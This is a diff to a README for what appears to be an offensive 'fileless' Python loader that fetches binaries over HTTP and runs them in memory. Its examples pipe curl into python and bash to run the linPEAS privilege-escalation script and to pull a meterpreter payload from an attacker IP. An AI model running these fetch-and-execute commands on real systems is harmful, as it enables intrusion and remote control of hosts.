@@ -6,8 +6,11 @@ Uses python to fetch a binary via http(s), write it to an in-memory file and exe
 ```bash
 python <(curl -s https://raw.githubusercontent.com/tav-r/Linux-hacks/main/fileless.py) https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -a
 ```
-or you might want to do something like this:
+of course this is pointless since you could also just run
+```bash
+bash <(curl -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
+```
+but maybe something like this?
 ```bash
 python <(curl -s http://10.10.14.3/fileless.py) http://10.10.14.3/meterpreter
 ```
-
